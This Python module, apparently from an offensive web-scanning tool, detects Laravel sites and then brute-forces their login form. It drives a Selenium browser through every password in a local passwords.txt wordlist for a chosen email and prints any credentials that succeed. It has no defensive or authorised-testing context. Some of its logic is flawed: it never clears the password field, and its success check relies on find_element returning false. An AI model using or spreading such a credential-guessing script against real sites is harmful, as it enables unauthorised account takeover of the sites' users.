from time import sleep
from Classes import Helper
from selenium.webdriver.common.by import By
import os
import requests
from alive_progress import alive_it


# Is a laravel login
def is_laravel(cookies, url, scripts, styles):
    if cookies:
        for cookie in cookies:
            if 'laravel_session' in cookie.get('name'):
                return True

    if scripts:
        for script in scripts:
            if url in script:
                # Script of the page / site not external
                response = requests.get(script)
                if response.status_code == 200:
                    text = response.text
                    text = text.lower()
                    if 'laravel' in text or 'livewire' in text:
                        return True

    return False


def get_information(with_login, browser, url, html, scripts, styles, page, cookies):
    print("This site is a laravel site")
    print('🔬 Get information')
    Helper.get_sitemap(url)
    login_url = get_login_url(url)
    print('Login url: ' + login_url)
    if login_url and Helper.yes_or_no('Try login with username and password?'):
        try_login(login_url, browser)
        print('🔐 Login required')


def try_login(login_url, browser):
    email = input('email : ')
    browser.get(login_url)
    sleep(2)
    browser.find_element(By.ID, "email").send_keys(email)
    with open(os.path.abspath(os.getcwd()) + "/passwords.txt") as f_in:
        lines = list(line for line in (l.strip() for l in f_in) if line)
        print('Try passwords on users:')
        print(email)
        for line in alive_it(lines):
            browser.find_element(By.ID, "password").send_keys(line)
            browser.find_element(By.TAG_NAME, 'form').submit()

            sleep(10)
            if not browser.find_element(By.TAG_NAME, 'form'):
                print('Success!')
                print('Email: ' + email)
                print('Password: ' + line)
                break


# get login url
def get_login_url(url):
    response = requests.get(Helper.get_base_url(url) + '/login')
    if response.status_code == 200:
        return response.url
    return False
